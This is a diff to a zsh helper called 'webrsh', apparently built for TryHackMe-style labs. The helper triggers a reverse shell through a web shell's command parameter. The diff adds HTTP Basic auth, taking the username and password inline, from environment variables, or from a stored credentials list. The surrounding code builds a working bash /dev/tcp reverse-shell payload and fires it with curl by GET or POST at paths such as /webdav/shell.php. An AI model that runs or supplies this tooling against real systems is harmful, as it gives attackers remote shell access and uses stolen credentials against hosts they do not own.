@@ -58,6 +58,57 @@ _webrsh-is-target() {
   [[ -n "${1:-}" && "${1:-}" != -* ]]
 }
 
+# Resolve HTTP Basic auth for curl (--user). Sets _WEBRSH_CURL_AUTH or clears it.
+# spec: user, user:pass, or empty (then WEBRSH_AUTH / WEBRSH_USER+WEBRSH_PASS)
+_webrsh-resolve-auth() {
+  local spec="${1:-}" target="${2:-}"
+  local ip user pass
+
+  _WEBRSH_CURL_AUTH=()
+
+  if [[ -z "$spec" && -z "${WEBRSH_AUTH:-}" && -z "${WEBRSH_USER:-}" ]]; then
+    return 0
+  fi
+
+  if [[ -n "${WEBRSH_AUTH:-}" ]]; then
+    spec="$WEBRSH_AUTH"
+  elif [[ -z "$spec" && -n "${WEBRSH_USER:-}" ]]; then
+    if [[ -n "${WEBRSH_PASS:-}" ]]; then
+      spec="${WEBRSH_USER}:${WEBRSH_PASS}"
+    else
+      spec="$WEBRSH_USER"
+    fi
+  fi
+
+  if [[ "$spec" == *:* ]]; then
+    user="${spec%%:*}"
+    pass="${spec#*:}"
+  else
+    user="$spec"
+    ip="$(python3 -c 'from urllib.parse import urlparse; import sys; print(urlparse(sys.argv[1]).hostname or "")' "$target" 2>/dev/null)"
+    [[ -z "$ip" ]] && ip="$(_recon-ip-default 2>/dev/null)"
+    if [[ -z "$ip" ]]; then
+      echo "[-] webrsh: cannot resolve target IP for creds-list (use -u user:pass)" >&2
+      return 1
+    fi
+    if ! pass="$(_recon-creds-for-user "$ip" "$user" 2>/dev/null)"; then
+      echo "[-] webrsh: no password for ${user}@${ip} (creds-list / use -u user:pass)" >&2
+      return 1
+    fi
+    echo "[*] auth: ${user}@${ip} (creds-list)" >&2
+  fi
+
+  if [[ -z "$user" ]]; then
+    return 0
+  fi
+
+  if [[ "$spec" == *:* ]]; then
+    echo "[*] auth: ${user} (inline)" >&2
+  fi
+
+  _WEBRSH_CURL_AUTH=(--user "${user}:${pass}")
+}
+
 # LHOST for reverse shells (TryHackMe VPN → tun0)
 _revshell-lhost() {
   local ip
@@ -90,12 +141,17 @@ _webrsh-trigger() {
   local port="${2:-4444}"
   local param="${3:-$(_webrsh-param-default)}"
   local method="${(U)${4:-$(_webrsh-method-default)}}"
+  local auth_spec="${5:-}"
   local lhost
+  local -a curl_auth=()
 
   lhost="$(_revshell-lhost)" || {
     echo "[-] LHOST not found (tun0/eth0)" >&2
     return 1
   }
+
+  _webrsh-resolve-auth "$auth_spec" "$target" || return 1
+  curl_auth=("${_WEBRSH_CURL_AUTH[@]}")
 
   local cmd="bash -c 'bash -i >& /dev/tcp/${lhost}/${port} 0>&1'"
   local enc
@@ -106,11 +162,11 @@ _webrsh-trigger() {
   case "$method" in
     GET)
       echo "[*] GET ${target}?${param}=..." >&2
-      curl -sS "${target}?${param}=${enc}"
+      curl -sS "${curl_auth[@]}" "${target}?${param}=${enc}"
       ;;
     POST)
       echo "[*] POST ${target} (${param}=...)" >&2
-      curl -sS -X POST --data-urlencode "${param}=${cmd}" "$target"
+      curl -sS "${curl_auth[@]}" -X POST --data-urlencode "${param}=${cmd}" "$target"
       ;;
     *)
       echo "[-] webrsh: unknown method: $method (use GET or POST)" >&2
@@ -123,7 +179,7 @@ _webrsh-trigger() {
 webrsh() {
   local param="$(_webrsh-param-default)"
   local method="$(_webrsh-method-default)"
-  local target_spec="" target="" listen_port="4444"
+  local target_spec="" target="" listen_port="4444" auth_spec=""
 
   (( $+functions[target-load] )) && [[ -z "${IP:-}" ]] && target-load 2>/dev/null
 
@@ -140,13 +196,21 @@ webrsh() {
         echo "  --post                shortcut for -X POST"
         echo "  -p, --param NAME      RCE parameter (default: cmd, or \$WEBRSH_PARAM)"
         echo "  -P, --listen-port N   revshell listener port (default: 4444)"
+        echo "  -u, --user USER[:PASS]  HTTP Basic Auth (PASS from creds-list if omitted)"
+        echo "                          or \$WEBRSH_AUTH / \$WEBRSH_USER+\$WEBRSH_PASS"
         echo ""
         echo "examples:"
         echo "  webrsh /home.php -p command -X POST"
         echo "  webrsh home.php -p command --post"
         echo "  webrsh :8080/home.php -p command -X POST -P 5555"
         echo "  webrsh http://\$IP/shell.php"
+        echo "  webrsh /webdav/shell.php -u wampp          # creds-list"
+        echo "  webrsh /webdav/shell.php -u wampp:xampp"
         return 0
+        ;;
+      -u|--user)
+        auth_spec="$2"
+        shift 2
         ;;
       -X|--method|--request)
         method="${(U)2}"
@@ -187,7 +251,7 @@ webrsh() {
 
   target="$(_webrsh-resolve-url "$target_spec")" || return 1
 
-  _webrsh-trigger "$target" "$listen_port" "$param" "$method"
+  _webrsh-trigger "$target" "$listen_port" "$param" "$method" "$auth_spec"
 }
 
 _webrsh() {
@@ -196,6 +260,7 @@ _webrsh() {
     '--post[use POST]' \
     '-p[RCE parameter name]:param name:(cmd command)' \
     '-P[revshell listener port]:port:(4444 5555 6666)' \
+    '-u[HTTP Basic user or user:pass]:user:' \
     '1:path or url:(/home.php home.php :8080/home.php)' \
     '*:path or url:(/home.php home.php :8080/home.php)'
 }
